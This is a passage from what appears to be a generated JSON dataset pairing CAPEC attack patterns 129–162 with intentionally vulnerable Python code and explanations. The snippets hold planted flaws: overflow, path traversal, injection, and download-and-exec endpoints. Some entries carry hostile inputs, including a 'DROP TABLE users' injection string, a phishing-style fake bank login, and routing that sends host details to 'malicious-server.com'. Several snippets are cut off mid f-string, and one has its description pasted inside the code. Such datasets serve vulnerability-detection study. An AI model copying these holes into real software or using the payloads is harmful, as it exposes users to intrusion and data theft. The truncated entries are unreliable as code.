        "code_snippet": "def process_transaction(amount1, amount2):\n    max_allowed = 2147483647  # Max value for 32-bit signed integer\n    \n    # Check if individual amounts are within max limit\n    if amount1 <= max_allowed and amount2 <= max_allowed:\n        total = amount1 + amount2  # Vulnerable to integer overflow\n        if total > 0:  # No minimum check\n            process_payment(total)\n            return True\n    return False\n\ndef process_payment(amount):\n    # Process the payment\n    pass\n\n# Example usage that could cause overflow\namount1 = 2000000000\namount2 = 2000000000\nresult = process_transaction(amount1, amount2)",
        "description": "This vulnerable code demonstrates integer overflow in a financial transaction system. It checks if individual amounts are within limits but fails to account for integer overflow when adding them. The total can wrap around to a negative number due to signed integer limitations. It also lacks proper minimum value validation and has incorrect calculation logic that assumes the sum will always be positive when both inputs are positive."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "def process_data(user_input):\n    # Convert user input to integer for pointer offset\n    offset = int(user_input)\n    \n    # Create a buffer with some data\n    buffer = bytearray(b'sensitive_data_here')\n    ptr = buffer\n    \n    # Perform unsafe pointer arithmetic based on user input\n    try:\n        # Manipulate pointer with untrusted offset\n        manipulated_ptr = ptr[offset:offset+4]\n        \n        # Attempt to access and modify memory at manipulated location\n        if manipulated_ptr:\n            manipulated_ptr[0] = 0x41  # Potentially accessing out-of-bounds memory\n            return bytes(manipulated_ptr)\n    except:\n        # Error handling might reveal buffer contents\n        return None",
        "description": "This code demonstrates vulnerable pointer manipulation by allowing arbitrary user input to control memory access offsets. It contains multiple vulnerabilities including improper bounds checking, untrusted pointer dereferencing, and potential NULL pointer dereferencing. The code attempts to manipulate a buffer using an untrusted offset value, which could lead to out-of-bounds memory access or buffer overflow conditions."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "class ResourceManager:\n    def __init__(self):\n        self.resource_list = []\n\n    def allocate_resource(self, size):\n        # Vulnerable: No size limit checking\n        # Vulnerable: No total allocation limit\n        new_resource = bytearray(size)  # Allocates memory without bounds\n        self.resource_list.append(new_resource)\n        return new_resource\n\n    def process_request(self, data):\n        # Vulnerable: No validation of data size\n        # Vulnerable: Resource not properly released\n        while True:\n            resource = self.allocate_resource(len(data) * 2)\n            # Process keeps allocating memory without freeing\n            resource.extend(data)\n\ndef handle_client_request(data):\n    manager = ResourceManager()\n    manager.process_request(data)\n\n# Usage that could trigger the vulnerability\nuser_data = b'A' * 1024 * 1024  # 1MB\nhandle_client_request(user_data)",
        "description": "This code demonstrates a vulnerable resource management system that allows unbounded memory allocation. It fails to implement limits on individual allocations, doesn't track total resource usage, and doesn't properly release resources. The process_request method creates an infinite loop of allocations, and the ResourceManager maintains references to all allocated resources without cleanup. An attacker can send a large payload to trigger excessive memory consumption with a single request."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "def process_requests(requests):\n    temp_files = []\n    for request in requests:\n        temp_file = open(f'temp_{request.id}.txt', 'w')\n        temp_files.append(temp_file)\n        \n        # Process request data\n        temp_file.write(request.data)\n        \n        # Resource leak: files are never closed\n        # Missing proper cleanup in error scenarios\n        \n        if len(temp_files) > 1000:\n            # Create new files without bound\n            continue\n            \n    # No cleanup of temp_files list or closing of file handles\n    return 'Processing complete'\n\ndef main():\n    while True:\n        requests = get_incoming_requests()\n        process_requests(requests)",
        "description": "This vulnerable code demonstrates multiple resource leaks by continuously opening temporary files without properly closing them. It fails to release system resources (file handles), leading to resource exhaustion. The code creates an unbounded number of file handles, doesn't implement proper cleanup, and lacks error handling for resource management. Each iteration potentially leaks more file descriptors, eventually depleting system resources and impacting service availability."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "def process_user_file(user_input):\n    file_path = os.path.join('/tmp', user_input)\n    \n    if os.path.exists(file_path):\n        with open(file_path, 'r') as file:\n            data = file.read()\n            process_data(data)\n            return True\n    return False\n\n# Usage\nfile_name = input('Enter file name: ')\nprocess_user_file(file_name)",
        "description": "This vulnerable code accepts a user-provided filename and attempts to process it from the /tmp directory without properly validating whether the file is a symbolic link or checking for race conditions. An attacker could create a symbolic link in /tmp pointing to sensitive files, and the code would follow this link, potentially accessing unauthorized files. The time-of-check to time-of-use (TOCTOU) race condition exists between the existence check and file opening."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "class ApplicationServer:\n    def __init__(self):\n        self._debug_mode = False\n        self._admin_mode = False\n        self._secret_key = 'sk_live_12345'\n\n    def process_command(self, command, args):\n        try:\n            if command == '--help':\n                return 'Available commands: --help, --version'\n            elif command == '--version':\n                return 'v1.0.0'\n            elif command == '--debug':\n                self._debug_mode = True\n                return f'Debug info: {self._secret_key}\\nSystem path: {os.environ.get(\"PATH\")}'\n            elif command == '--hidden-admin' and not args:\n                self._admin_mode = True\n                return 'Admin mode activated'\n            elif command == '--test-connection':\n                # Unchecked error condition\n                socket.connect(('localhost', 8080))\n                return 'Connected'\n            else:\n                return 'Unknown command'\n        except Exception:\n            # Silently ignore errors\n            pass\n\n    def execute(self, user_input):\n        command = user_input.split()[0]\n        args = user_input.split()[1:] if len(user_input.split()) > 1 else []\n        return self.process_command(command, args)",
        "description": "This code demonstrates a vulnerable application server that contains hidden functionality (--hidden-admin command), incomplete input validation, unchecked error conditions, and debug components that leak sensitive information when activated. The server processes various command-line switches without proper documentation or security controls, allowing attackers to discover and exploit hidden features through trial and error."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "\"\"\"\ndef send_email(recipient, subject, content):\n    # Vulnerable email header construction without proper sanitization\n    email_headers = f'''To: {recipient",
        "description": "\"This code demonstrates a vulnerable email sending function that fails to properly sanitize header fields and content. It allows injection of CRLF sequences and special characters that can manipulate email headers and content structure. An attacker could inject additional headers or modify existing ones by including newlines and other special characters in the recipient, subject, or content parameters.\""
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "def process_user_data(user_input):\n    template = \"User data: %s\"\n    print(template % user_input)\n\ndef main():\n    # Get user input from a form or external source\n    external_data = input('Enter your data: ')\n    # No validation of format string specifiers\n    process_user_data(external_data)\n\nif __name__ == \"__main__\":\n    main()",
        "description": "This code demonstrates a format string vulnerability where user input is directly used in a string formatting operation without proper validation. An attacker could input format specifiers like %x or %n to potentially read memory contents or cause buffer overflows. The code fails to validate or sanitize the input against format string specifiers, making it vulnerable to format string attacks."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "def authenticate_user(username):\n    ldap_conn = ldap.initialize('ldap://localhost')\n    # Vulnerable: Direct user input used in LDAP filter without sanitization\n    search_filter = f'(uid={username})'\n    try:\n        result = ldap_conn.search_s('dc=example,dc=com',\n                                   ldap.SCOPE_SUBTREE,\n                                   search_filter,\n                                   ['cn', 'mail'])\n        return result\n    except:\n        return None\n    finally:\n        ldap_conn.unbind()",
        "description": "This code demonstrates a vulnerable LDAP authentication system where user input is directly concatenated into an LDAP search filter without proper sanitization. An attacker could inject special characters like '*' or '(' to manipulate the query and potentially access unauthorized information about other users in the system."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "\"\"\"\ndef process_user_request(user_input):\n    base_url = 'http://example.com/api'\n    # Vulnerable: Directly using user input in GET request parameters\n    request_url = f'{base_url",
        "description": "\"This vulnerable code demonstrates parameter injection by directly incorporating unvalidated user input into both HTTP GET request parameters and command execution. The code fails to properly encode or escape special characters, allowing attackers to inject additional parameters in the URL or execute arbitrary commands. It combines GET request parameter manipulation with command injection vulnerabilities.\""
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "\"\"\"\nimport importlib\n\ndef load_and_execute_module(module_name, class_name, method_name, *args):\n    try:\n        # Dynamically load module based on user input\n        module = importlib.import_module(module_name)\n        \n        # Get class from module using reflection\n        target_class = getattr(module, class_name)\n        \n        # Create instance and get method\n        instance = target_class()\n        method = getattr(instance, method_name)\n        \n        # Execute method with provided arguments\n        result = method(*args)\n        return result\n    \n    except Exception as e:\n        return str(e)\n\n# Vulnerable usage\nuser_input_module = input(\"Enter module name: \")\nuser_input_class = input(\"Enter class name: \")\nuser_input_method = input(\"Enter method name: \")\nuser_args = input(\"Enter arguments (comma-separated): \").split(',')\n\nresult = load_and_execute_module(user_input_module, user_input_class, user_input_method, *user_args)\nprint(result)\n\"\"\",\n    \"description\": \"This code demonstrates unsafe reflection by allowing user input to directly control which modules, classes, and methods are loaded and executed. An attacker could input malicious module names or method names to execute unauthorized code or access sensitive information. The code lacks input validation and allows arbitrary code execution through reflection, making it vulnerable to code injection and command injection attacks.\"",
        "description": "\"This code demonstrates unsafe reflection by allowing user input to directly control which modules, classes, and methods are loaded and executed. An attacker could input malicious module names or method names to execute unauthorized code or access sensitive information. The code lacks input validation and allows arbitrary code execution through reflection, making it vulnerable to code injection and command injection attacks.\""
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "def read_user_file(filename):\n    base_dir = '/var/www/user_files/'\n    file_path = base_dir + filename\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except Exception as e:\n        return str(e)\n\ndef handle_request(user_input):\n    content = read_user_file(user_input)\n    return content",
        "description": "This code is vulnerable to path traversal attacks because it directly concatenates user input to create file paths without sanitization. An attacker can use '../' sequences (e.g., '../../../etc/passwd') to access files outside the intended directory. The code lacks proper input validation and path normalization, making it susceptible to CWE-23, CWE-22, and related path traversal vulnerabilities."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "from flask import Flask, request, session\n\napp = Flask(__name__)\napp.secret_key = 'secret123'\n\n@app.route('/form1', methods=['POST'])\ndef form1():\n    session['step1_completed'] = True\n    session['user_data'] = request.form\n    return 'Form 1 completed'\n\n@app.route('/form2', methods=['POST'])\ndef form2():\n    # Vulnerable: No proper state checking\n    # Missing validation of form sequence\n    user_data = session.get('user_data', {})\n    user_data.update(request.form)\n    \n    # Process sensitive data without verifying previous steps\n    process_order(user_data)\n    return 'Order processed'\n\ndef process_order(data):\n    # Process the order without validation\n    order_id = data.get('order_id')\n    user_id = data.get('user_id')\n    amount = data.get('amount')\n    # ... process order logic ...",
        "description": "This vulnerable code implements a multi-step form processing system where the second form can be accessed directly without completing the first form. It fails to properly validate the form sequence state and relies on session data without proper verification. The code also lacks CSRF protection and proper authorization checks, allowing attackers to bypass the intended form flow and potentially access or modify other users' data."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "import requests\nimport json\nfrom cachetools import TTLCache\n\nclass WebCache:\n    def __init__(self):\n        self.cache = TTLCache(maxsize=100, ttl=3600)\n        self.trusted_hosts = ['trusted-server.com']\n    \n    def fetch_and_cache_data(self, url):\n        try:\n            response = requests.get(url, verify=False)  # Disabling SSL verification\n            data = response.json()\n            \n            # No validation of data source or content\n            self.cache[url] = data\n            return data\n            \n        except Exception as e:\n            return None\n    \n    def get_cached_data(self, url):\n        if url in self.cache:\n            return self.cache[url]\n        return self.fetch_and_cache_data(url)\n\ncache = WebCache()\ndata = cache.get_cached_data('http://untrusted-source.com/api/sensitive_data')\nsecret_info = data.get('confidential_info')",
        "description": "This vulnerable code implements a web cache system that stores API responses without proper validation of the data source or content authenticity. It accepts and caches data from any URL without verifying the source's trustworthiness, stores sensitive information in an accessible cache, and doesn't validate the origin of the data. The code disables SSL verification and lacks proper error handling, making it susceptible to cache poisoning attacks where malicious data could be stored and treated as trusted information."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "import dns.resolver\nimport socket\n\ndef resolve_domain(domain):\n    # Insecure DNS resolver that doesn't validate responses\n    resolver = dns.resolver.Resolver()\n    \n    # Configure resolver to use potentially compromised DNS server\n    resolver.nameservers = ['8.8.8.8']\n    \n    try:\n        # Blindly trust DNS response without verification\n        answers = resolver.resolve(domain, 'A')\n        ip_address = str(answers[0])\n        \n        # Perform reverse DNS lookup without validation\n        hostname = socket.gethostbyaddr(ip_address)[0]\n        \n        # Use the resolved IP without checking if it matches original domain\n        return ip_address\n        \n    except Exception as e:\n        return None\n\ndef connect_to_service(domain):\n    ip = resolve_domain(domain)\n    if ip:\n        # Establish connection without verifying if IP is legitimate\n        socket.create_connection((ip, 80), timeout=10)",
        "description": "This code demonstrates vulnerable DNS resolution by accepting potentially poisoned DNS responses without proper verification. It uses a DNS resolver without implementing DNSSEC or other authentication measures, blindly trusts reverse DNS lookups, and doesn't validate that resolved IPs match the expected domain. This makes it susceptible to DNS cache poisoning and pharming attacks."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "from flask import Flask, send_file, request\nimport os\n\napp = Flask(__name__)\n\n@app.route('/<path:filepath>')\ndef serve_file(filepath):\n    base_path = '/var/www/'\n    requested_path = os.path.join(base_path, filepath)\n    \n    if os.path.exists(requested_path):\n        return send_file(requested_path)\n    \n    return 'File not found', 404\n\n@app.route('/git/')\ndef serve_git():\n    return send_file('.git/config')\n\n@app.route('/download_update')\ndef update_system():\n    import urllib.request\n    code_url = request.args.get('url')\n    if code_url:\n        code = urllib.request.urlopen(code_url).read()\n        with open('update.py', 'wb') as f:\n            f.write(code)\n        exec(code)\n    return 'Update complete'",
        "description": "This vulnerable code demonstrates directory traversal and forced browsing vulnerabilities by allowing direct access to any file under the web root, exposing version control files, and downloading/executing code without proper validation. It lacks proper authorization checks and allows unrestricted access to potentially sensitive files and directories."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "\"\"\"\nfrom flask import Flask, send_file, request\nimport os\nimport requests\n\napp = Flask(__name__)\n\n@app.route('/admin/wsdl')\ndef expose_wsdl():\n    return send_file('service.wsdl', as_attachment=True)\n\n@app.route('/internal/update')\ndef update_service():\n    # Download and execute code without integrity checks\n    code_url = request.args.get('url', '')\n    r = requests.get(code_url)\n    with open('temp_service.py', 'wb') as f:\n        f.write(r.content)\n    os.system('python temp_service.py')\n    return 'Service updated'\n\n@app.route('/.git')\ndef expose_git():\n    # Accidentally exposed git repository\n    return send_file('.git/config')\n\n@app.route('/debug/service-info')\ndef service_info():\n    # No authentication check, exposing internal service details\n    services = {\n        'internal_api': 'http://localhost:8080/api',\n        'admin_console': 'http://localhost:8081/admin',\n        'backup_service': 'http://localhost:8082/backup'",
        "description": "\"This vulnerable code demonstrates several security issues related to unpublished web services. It exposes sensitive WSDL files without authentication, allows arbitrary code download and execution without integrity checks, exposes version control repository data, and provides internal service information without proper authorization. The debug mode is also enabled, which could reveal sensitive application details.\""
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "def verify_message_integrity(message, received_checksum):\n    # Weak hash function (MD5) used for checksum\n    import hashlib\n    \n    # No integrity check during transmission\n    computed_checksum = hashlib.md5(message.encode()).hexdigest()\n    \n    # Simple equality comparison without timing-safe comparison\n    if computed_checksum == received_checksum:\n        process_message(message)\n        return True\n    return False\n\ndef process_message(message):\n    # Process received message without additional validation\n    data = message.split(':')\n    command = data[0]\n    payload = data[1]\n    \n    # Execute command without verifying source or integrity\n    exec(command)",
        "description": "This code demonstrates vulnerable checksum validation by using a weak hash function (MD5), lacking proper transmission integrity checks, and performing unsafe message processing. The code fails to implement secure checksum comparison and allows arbitrary command execution without proper validation, making it susceptible to checksum spoofing attacks."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "\"\"\"\nimport xml.etree.ElementTree as ET\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/process_xml', methods=['POST'])\ndef process_xml():\n    xml_data = request.form.get('xml_data')\n    schema_url = request.form.get('schema_url')\n    \n    try:\n        # Parse XML without schema validation\n        tree = ET.fromstring(xml_data)\n        \n        # Process XML using unsafe XPath query from user input\n        search_term = request.form.get('search')\n        xpath_query = f\"//user[name='{search_term",
        "description": "\"This vulnerable code demonstrates XML schema poisoning by accepting unvalidated XML input and schema URLs from users. It processes XML without schema validation, uses unescaped user input in XPath queries, and allows external control of schema locations. The code is susceptible to XML injection, XPath injection, and schema manipulation attacks.\""
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "from flask import Flask, request\nimport xml.etree.ElementTree as ET\n\napp = Flask(__name__)\n\n@app.route('/process_xml', methods=['POST'])\ndef process_xml():\n    xml_data = request.data\n    try:\n        # No validation of XML size or rate limiting\n        # No schema validation\n        tree = ET.fromstring(xml_data)\n        \n        # Resource-intensive processing\n        for elem in tree.iter():\n            # Deep recursive processing without limits\n            process_element(elem)\n            \n        # Store processed data in memory without limits\n        processed_data.append(tree)\n        \n        return 'XML processed successfully'\n    except Exception as e:\n        return str(e)\n\ndef process_element(elem):\n    # Simulate expensive processing\n    import time\n    time.sleep(0.1)\n    \n    # Recursive processing without depth limits\n    for child in elem:\n        process_element(child)\n\nprocessed_data = []\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080)",
        "description": "This vulnerable code implements a SOAP-like XML processing endpoint that is susceptible to XML-based resource depletion attacks. It lacks input validation, rate limiting, and resource consumption controls. The code processes XML messages recursively without size limits or schema validation, stores processed data indefinitely in memory, and performs expensive operations for each element. This makes it vulnerable to denial of service attacks through rapid submission of small, complex XML messages that consume excessive CPU and memory resources."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "class MessageHandler:\n    def __init__(self):\n        self.trusted_sources = ['trusted_domain.com']\n\n    def process_message(self, message, source):\n        # Vulnerable: No cryptographic verification of message integrity\n        # No verification if source is actually who they claim to be\n        if source.endswith(self.trusted_sources[0]):\n            # Vulnerable: Direct content processing without validation\n            content = message.get('content')\n            destination = message.get('destination')\n            \n            # Vulnerable: No CSRF token verification\n            if 'transfer_funds' in content:\n                amount = content.get('amount')\n                recipient = content.get('recipient')\n                self.execute_transfer(amount, recipient)\n            \n            # Vulnerable: Raw content delivery without parsing/sanitization\n            if 'html_content' in content:\n                self.deliver_content(content['html_content'])\n                \n    def execute_transfer(self, amount, recipient):\n        # Vulnerable: No additional verification of transaction authenticity\n        print(f'Transferring ${amount} to {recipient}')\n        \n    def deliver_content(self, html_content):\n        # Vulnerable: Direct delivery of potentially modified content\n        with open('web_root/content.html', 'w') as f:\n            f.write(html_content)",
        "description": "This code demonstrates a vulnerable message handling system that fails to properly verify message authenticity, validate content integrity, and protect against content spoofing. It accepts messages without cryptographic verification, processes financial transactions without proper authorization, and delivers web content without sanitization, making it susceptible to content spoofing attacks."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "def process_user_data(user_input):\n    temp_dir = '/tmp/'\n    temp_filename = user_input + '_data.txt'\n    temp_path = temp_dir + temp_filename\n    \n    # Write sensitive data to temporary file\n    with open(temp_path, 'w') as f:\n        f.write('SECRET_API_KEY=abc123\\n')\n        f.write('USER_PASSWORD=password123\\n')\n    \n    # Process the data\n    process_file(temp_path)\n    \n    # Attempt to remove the file later\n    if os.path.exists(temp_path):\n        os.remove(temp_path)",
        "description": "This code creates a temporary file with predictable naming in a public directory using user-controlled input. The file is created with default permissions, potentially exposing sensitive data. The code fails to use secure temporary file creation methods, doesn't implement proper file locking, and leaves the file vulnerable to race conditions and symlink attacks. The file name is predictable and user-controlled, making it susceptible to path traversal attacks."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "def process_sensitive_data(user_id):\n    # Store sensitive data in default, well-known location\n    sensitive_file_path = '/etc/userdata/credentials.txt'\n    debug_log_path = '/var/log/debug/trace.log'\n    \n    # Improper handling of sensitive data\n    with open(sensitive_file_path, 'w') as f:\n        f.write(f'User: {user_id}\\nKey: {generate_secret_key()}\\n')\n    \n    # Debug data left in accessible location\n    with open(debug_log_path, 'a') as log:\n        log.write(f'DEBUG: Processing data for {user_id}\\n')\n    \n    # Memory not properly cleared\n    buffer = bytearray(get_encryption_key())\n    buffer.clear()  # Insufficient clearing of sensitive data\n    \n    os.chmod(sensitive_file_path, 0o644)  # World-readable permissions\n    return True",
        "description": "This code demonstrates multiple security vulnerabilities including storing sensitive data in predictable locations, improper file permissions, inadequate clearing of sensitive data, and leaving debug traces exposed. It stores credentials in a well-known directory, leaves debug logs in an accessible location, and fails to properly scrub sensitive data from memory."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "class AuthenticationSystem:\n    def __init__(self):\n        self.users = {'admin': 'password123'}\n        self.ip_whitelist = ['192.168.1.1']\n        self.session_tokens = {}\n    \n    def authenticate(self, username, password, ip_address):\n        # Weak authentication: Only checks if IP is in whitelist\n        if ip_address in self.ip_whitelist:\n            return True\n        \n        # Assumes token is immutable and trustworthy without verification\n        if username in self.session_tokens:\n            return True\n            \n        # Basic password check without proper hashing/salting\n        if username in self.users and self.users[username] == password:\n            self.session_tokens[username] = f'STATIC_TOKEN_{username}'\n            return True\n            \n        return False\n\n    def get_user_data(self, token):\n        # Vulnerable to spoofing - no verification of token authenticity\n        if token.startswith('STATIC_TOKEN_'):\n            username = token.split('_')[2]\n            return f'Sensitive data for {username}'",
        "description": "This code demonstrates multiple authentication vulnerabilities including weak authentication mechanisms, authentication bypass through IP spoofing, token spoofing, and improper validation of credentials. The system assumes IP addresses and tokens are immutable and trustworthy, and implements basic password checking without proper security measures, making it susceptible to identity spoofing attacks."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "def process_user_data(user_input):\n    # No validation of input format/type\n    user_data = user_input.split(',')\n    \n    # Blindly process data assuming specific structure\n    username = user_data[0]\n    role = user_data[1]\n    \n    # Security decision based on untrusted input\n    if role == 'admin':\n        grant_admin_access(username)\n    \n    # Database query without proper validation\n    query = f\"SELECT * FROM users WHERE username = {username}\"\n    execute_query(query)\n\n# Example usage\nuser_input = \"malicious_user', 'admin'); DROP TABLE users; --\"\nprocess_user_data(user_input)",
        "description": "This vulnerable code demonstrates improper input validation by accepting user input without validating its format, structure, or type. It splits the input assuming a specific format, makes security decisions based on untrusted data, and uses the input directly in database queries. An attacker can exploit this by providing malformed input to bypass security controls or inject malicious code."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "\"\"\"\nimport tkinter as tk\nfrom urllib.parse import urlparse\nimport requests\n\nclass FakeLoginWindow:\n    def __init__(self):\n        self.window = tk.Tk()\n        self.window.title('Secure Bank Login')\n        \n        # Spoofed bank logo\n        self.logo_label = tk.Label(self.window, text='TrustedBank™')\n        self.logo_label.pack()\n        \n        self.username = tk.Entry(self.window)\n        self.password = tk.Entry(self.window, show='*')\n        self.username.pack()\n        self.password.pack()\n        \n        self.login_button = tk.Button(self.window, text='Login', command=self.handle_login)\n        self.login_button.pack()\n\n    def handle_login(self):\n        credentials = {\n            'username': self.username.get(),\n            'password': self.password.get()",
        "description": "\"This code creates a spoofed banking login interface that misrepresents itself as a legitimate bank application. It fails to properly verify the communication endpoint, allows destination spoofing, and sends captured credentials to a malicious endpoint. The UI deliberately misrepresents critical security information to deceive users.\""
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "import tempfile\nimport os\n\ndef process_sensitive_data(user_data):\n    # Create temp file in /tmp with world-readable permissions\n    temp_file = tempfile.mktemp()\n    with open(temp_file, 'w') as f:\n        f.write(f'Credit Card: {user_data[\"cc_number\"]}\\n')\n        f.write(f'SSN: {user_data[\"ssn\"]}\\n')\n        f.write(f'Password: {user_data[\"password\"]}\\n')\n    \n    # Process data\n    process_payment(temp_file)\n    \n    # Attempt to delete file but leave window of vulnerability\n    if os.path.exists(temp_file):\n        os.remove(temp_file)\n\ndef cache_user_data(user_data):\n    cache_dir = '/var/www/html/cache'\n    cache_file = os.path.join(cache_dir, f'user_{user_data[\"id\"]}.txt')\n    \n    # Store sensitive data in web-accessible directory\n    with open(cache_file, 'w') as f:\n        f.write(str(user_data))\n\ndef process_payment(file_path):\n    pass",
        "description": "This code demonstrates multiple unsafe temporary file practices including: using tempfile.mktemp() which is race-condition prone, storing sensitive data in temporary files with insecure permissions, placing sensitive cache files in web-accessible directories, and leaving temporary files on disk longer than necessary. The code creates temporary files without proper access controls and stores sensitive information like credit card numbers and SSNs in these files."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "class SensitiveDataTransmission:\n    def __init__(self, username, password, credit_card):\n        self.username = username\n        self.password = password\n        self.credit_card = credit_card\n    \n    def send_data(self):\n        # Vulnerable: sending sensitive data in cleartext\n        message = f\"username={self.username}&password={self.password}&cc={self.credit_card}\"\n        \n        # Simulating network transmission without encryption\n        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        connection.connect(('api.example.com', 80))\n        connection.send(message.encode())\n        \n        # No message integrity check\n        response = connection.recv(1024)\n        connection.close()\n        return response",
        "description": "This code demonstrates vulnerable transmission of sensitive data by sending unencrypted credentials and credit card information over a network connection. The code lacks encryption (CWE-311), transmits cleartext sensitive data (CWE-319), and doesn't implement message integrity checks (CWE-924). This makes it susceptible to sniffing attacks where an adversary can passively intercept and read the transmitted data."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "\"\"\"\nimport socket\nimport sys\n\ndef send_sensitive_data(host, port, username, password, credit_card):\n    # Create socket connection\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    \n    try:\n        sock.connect((host, port))\n        \n        # Send sensitive data in cleartext\n        message = f\\\"\\\"\\\"\n        Username: {username",
        "description": "\"This vulnerable code demonstrates transmission of sensitive data (credentials and credit card information) in cleartext over a network connection. It lacks encryption, authentication verification, and message signing, making it susceptible to network sniffing attacks. The code also leaks system information and doesn't implement any protection against replay attacks or control of network message volume.\""
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "import os\nimport sys\n\ndef load_library(library_name):\n    # Search for libraries in multiple paths including user-provided paths\n    search_paths = [\n        '.',\n        '/usr/lib',\n        os.getenv('CUSTOM_LIB_PATH', ''),  # Dangerous: User-controlled path\n        sys.argv[1] if len(sys.argv) > 1 else ''  # Dangerous: Command-line path\n    ]\n    \n    for path in search_paths:\n        lib_path = os.path.join(path, library_name)\n        if os.path.exists(lib_path):\n            try:\n                # Dangerous: Loading library from potentially untrusted path\n                return __import__(lib_path)\n            except ImportError:\n                continue\n    \n    return None\n\n# Vulnerable usage\ndef main():\n    crypto_lib = load_library('crypto_utils.py')\n    if crypto_lib:\n        # Use the potentially malicious library\n        crypto_lib.encrypt_data('sensitive_data')",
        "description": "This code demonstrates a vulnerable library loading mechanism that searches for and loads libraries from multiple paths, including user-controlled locations. The vulnerability allows an attacker to place a malicious library in one of the search paths, which will then be loaded and executed with the application's privileges. The code embodies CWE-426 (Untrusted Search Path) and CWE-427 (Uncontrolled Search Path Element) by using environment variables and command-line arguments to influence the library search path."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "from flask import Flask, render_template_string, request\n\napp = Flask(__name__)\n\n@app.route('/message')\ndef message():\n    user_msg = request.args.get('msg', '')\n    template = '''<html>\n        <head><title>Message</title></head>\n        <body>\n            <h1>Your Message:</h1>\n            ''' + user_msg + '''\n        </body>\n    </html>'''\n    return render_template_string(template)\n\n@app.route('/error')\ndef error_page():\n    error_msg = request.args.get('error', '')\n    return f'<html><body><h1>Error occurred:</h1>{error_msg}</body></html>'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "Vulnerable web application that directly embeds user input into HTML templates without proper sanitization, allowing for XSS attacks through URL parameters. The code demonstrates template injection vulnerability and unsafe error message handling, where attacker-controlled input can include malicious scripts that will be executed in users' browsers."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "import socket\nimport ssl\n\nclass UnsecureRouter:\n    def __init__(self):\n        self.routing_table = {}\n        self.trusted_endpoints = {}\n    \n    def route_message(self, message, destination):\n        # Vulnerable: No validation of destination authenticity\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n        # Vulnerable: No proper TLS verification\n        context = ssl._create_unverified_context()\n        ssock = context.wrap_socket(sock)\n        \n        # Vulnerable: No message integrity check\n        try:\n            # Vulnerable: Destination can be manipulated\n            host = self.routing_table.get(destination, 'malicious-server.com')\n            ssock.connect((host, 443))\n            \n            # Vulnerable: System info leaked in headers\n            headers = f'X-System-Info: {socket.gethostname()};{socket.gethostbyname(socket.gethostname())}\\n'\n            ssock.send(headers.encode() + message)\n            \n            response = ssock.recv(1024)\n            return response\n        except Exception as e:\n            # Vulnerable: Error reveals system info\n            return f'Error: {str(e)} on {socket.gethostname()}'",
        "description": "This code demonstrates a vulnerable routing implementation that allows message interception and redirection. It lacks proper endpoint validation, uses unverified SSL connections, doesn't check message integrity, and leaks system information. An attacker could exploit this to perform pharming attacks by manipulating the routing table or intercepting communications."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
